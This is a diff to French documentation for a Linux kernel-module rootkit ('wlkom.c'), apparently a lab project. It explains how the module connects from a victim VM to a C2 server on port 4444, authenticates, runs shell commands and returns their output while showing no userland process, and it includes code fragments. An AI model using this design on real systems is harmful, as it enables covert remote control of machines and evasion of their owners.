@@ -1,26 +1,24 @@
 # wlkom.c — Le module kernel
 
-`rootkit/wlkom.c` est le cœur du projet. C'est un module noyau Linux (LKM — Loadable Kernel Module) qui tourne dans l'espace kernel de la VM Victime. Tout ce qu'il fait — créer un socket, se connecter en TCP, exécuter des commandes — se passe dans le kernel, sans aucun processus userland visible.
-
-Le fichier fait ~290 lignes. Il est organisé de façon logique : les utilitaires bas niveau en premier, les fonctions de haut niveau ensuite, et l'init/exit à la fin.
+`rootkit/wlkom.c` est le cœur du projet. C'est un module noyau Linux (LKM — Loadable Kernel Module) qui tourne dans l'espace kernel de la VM Victime. Tout ce qu'il fait : créer un socket, se connecter en TCP, exécuter des commandes ; se passe dans le kernel, sans aucun processus userland visible.
 
 ---
 
 ## Paramètres du module
 
 ```c
-static char *password_hash = NULL;
+static char *password_hash = "";
 static char *c2_ip   = "192.168.100.10";
 static int   c2_port = 4444;
 
 module_param(password_hash, charp, 0400);
-module_param(c2_ip, charp, 0);
-module_param(c2_port, int, 0);
+module_param(c2_ip,         charp, 0400);
+module_param(c2_port,       int,   0400);
 ```
 
-`module_param` est la façon idiomatique de passer de la configuration à un LKM. Les valeurs sont fournies à l'exécution via `insmod` ou lues depuis `/etc/modprobe.d/` par `modprobe`. Le `.ko` compilé ne contient aucune valeur en dur — ce qui est essentiel : un `strings wlkom.ko` n'exposerait pas le hash.
+`module_param` est la façon idiomatique de passer de la configuration à un LKM. Avec `insmod`, les valeurs se passent en ligne de commande (`insmod wlkom.ko password_hash=...`). Avec `modprobe`, il les lit automatiquement depuis `/etc/modprobe.d/wlkom.conf`. C'est ce que fait le service systemd. Dans les deux cas, le `.ko` compilé ne contient aucune valeur en dur : un `strings wlkom.ko` n'exposerait pas le hash.
 
-Le mode `0400` sur `password_hash` signifie que le paramètre est lisible depuis `/sys/module/wlkom/parameters/password_hash` uniquement par root. C'est une précaution minimale pour éviter qu'un utilisateur non-privilégié puisse lire le hash depuis le sysfs.
+Le mode `0400` est appliqué aux trois paramètres : ils sont lisibles depuis `/sys/module/wlkom/parameters/` uniquement par root. C'est une précaution minimale pour éviter qu'un utilisateur non-privilégié puisse lire le hash ou les paramètres réseau depuis le sysfs.
 
 `password_hash` est le seul paramètre sans valeur par défaut. Si le module est chargé sans lui, `wlkom_init()` retourne `-EINVAL` et le chargement échoue. C'est voulu : un module sans authentification ne doit pas pouvoir démarrer.
 
@@ -43,16 +41,16 @@ Elle termine le buffer avec un `\0` et retourne la longueur lue (sans le `\n`), 
 ## `send_reply` — envoyer une réponse
 
 ```c
-static int send_reply(struct socket *sock, const char *msg, int len)
+static int send_reply(const char *reply)
 ```
 
-Un wrapper fin autour de `kernel_sendmsg`. Il construit un `kvec` (kernel iovec) pointant vers le buffer et appelle `kernel_sendmsg` en mode bloquant. Rien de remarquable, mais avoir un wrapper évite de répéter le boilerplate `kvec`/`msg_hdr` dans chaque endroit où on envoie quelque chose.
+Un wrapper fin autour de `kernel_sendmsg`. Il construit un `kvec` (kernel iovec) pointant vers le buffer et appelle `kernel_sendmsg` en mode bloquant. La fonction utilise `conn_sock`, le socket global du module. Avoir un wrapper évite de répéter le boilerplate `kvec`/`msg_hdr` partout.
 
 ---
 
 ## `execute_and_send_output` — exécuter une commande et renvoyer le résultat
 
-C'est la fonction la plus complexe du module. Elle prend une chaîne de commande shell, l'exécute côté victime, et envoie stdout, stderr et l'exit code au C2.
+Elle prend une chaîne de commande shell, l'exécute côté victime, et envoie stdout, stderr et l'exit code au C2.
 
 ### Construire la commande shell
 
@@ -112,24 +110,20 @@ C'est une tentative de nettoyage basique. Les fichiers ne restent pas indéfinim
 ## `authenticate_c2` — valider l'authentification
 
 ```c
-static int authenticate_c2(struct socket *sock)
+static int authenticate_c2(void)
 ```
 
-Le C2 envoie `AUTH <hash>\n` dès qu'un client se connecte. Cette fonction lit cette ligne, vérifie qu'elle commence par `AUTH `, et compare le reste avec `password_hash`.
-
-La comparaison est faite avec `strncmp` sur les 8 premiers caractères (un hash FNV-1a 32-bit en hexadécimal fait exactement 8 caractères). Si la comparaison échoue, la fonction retourne une erreur et `connection_thread` ferme la connexion puis retente.
-
-Si `password_hash` est NULL à ce stade, on retourne une erreur — mais en pratique c'est impossible car `wlkom_init` a déjà vérifié sa présence au chargement.
+Le C2 envoie `AUTH <hash>\n` dès que la connexion est établie. Cette fonction lit cette ligne via `recv_line`, vérifie qu'elle commence par `AUTH `, et compare le reste avec `password_hash` via `strcmp`. Si la comparaison échoue, la fonction retourne une erreur et `connection_thread` ferme la connexion puis retente.
 
 ---
 
 ## `do_connect` — établir la connexion TCP
 
 ```c
-static int do_connect(struct socket **sock_out)
+static int do_connect(void)
 ```
 
-Cette fonction crée un socket TCP kernel et tente de se connecter au C2.
+Cette fonction crée un socket TCP kernel, tente de se connecter au C2, et stocke le socket dans `conn_sock` (global du module).
 
 ### Créer le socket
 
@@ -145,7 +139,7 @@ sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
 in4_pton(c2_ip, -1, (u8 *)&addr.sin_addr.s_addr, '\0', NULL);
 ```
 
-`in4_pton` convertit une chaîne IPv4 en représentation binaire réseau. Il n'y a pas de `inet_aton` dans le kernel — c'est une fonction userland de la libc. `in4_pton` est son équivalent kernel.
+`in4_pton` convertit une chaîne IPv4 en représentation binaire réseau. Il n'y a pas de `inet_aton` dans le kernel. C'est une fonction userland de la libc. `in4_pton` est son équivalent kernel.
 
 ### Se connecter
 
@@ -188,7 +182,7 @@ while (!kthread_should_stop()) {
 
 **Pourquoi le thread est bloqué sur `recv_line` et comment le débloquer ?**
 
-`kernel_recvmsg` est bloquant par conception. Quand le thread y est bloqué, il ne peut pas tester `kthread_should_stop()`. La seule façon de le débloquer est de fermer le socket depuis l'extérieur — ce que fait `wlkom_exit` avec `kernel_sock_shutdown`.
+`kernel_recvmsg` est bloquant par conception. Quand le thread y est bloqué, il ne peut pas tester `kthread_should_stop()`. La seule façon de le débloquer est de fermer le socket depuis l'extérieur, ce que fait `wlkom_exit` avec `kernel_sock_shutdown`.
 
 ---
 
@@ -200,7 +194,7 @@ while (!kthread_should_stop()) {
 static int __init wlkom_init(void)
 ```
 
-Vérifie que `password_hash` est fourni et non vide, puis lance le kthread avec `kthread_run`. Le module est opérationnel dès que le thread démarre — l'init retourne immédiatement sans attendre la connexion.
+Vérifie que `password_hash` est fourni et non vide, puis lance le kthread avec `kthread_run`. Le module est opérationnel dès que le thread démarre. L'init retourne immédiatement sans attendre la connexion.
 
 ### Exit
 
@@ -210,8 +204,8 @@ static void __exit wlkom_exit(void)
 
 L'ordre des opérations est critique :
 
-1. `kernel_sock_shutdown(sock, SHUT_RDWR)` — force `recvmsg` à retourner avec une erreur, débloquant le thread
-2. `kthread_stop(task)` — attend que le thread se termine proprement
-3. `sock_release(sock)` — libère le socket
+1. `kernel_sock_shutdown(sock, SHUT_RDWR)` : force `recvmsg` à retourner avec une erreur, débloquant le thread
+2. `kthread_stop(task)` : attend que le thread se termine proprement
+3. `sock_release(sock)` : libère le socket
 
-Si on inversait 1 et 2, `kthread_stop` bloquerait indéfiniment car le thread ne peut pas sortir de `recvmsg` tout seul. Si on faisait 3 avant 2, on libérerait un socket encore en cours d'utilisation par le thread — corruption mémoire garantie.
+Si on inversait 1 et 2, `kthread_stop` bloquerait indéfiniment car le thread ne peut pas sortir de `recvmsg` tout seul. Si on faisait 3 avant 2, on libérerait un socket encore en cours d'utilisation par le thread, corruption mémoire garantie.
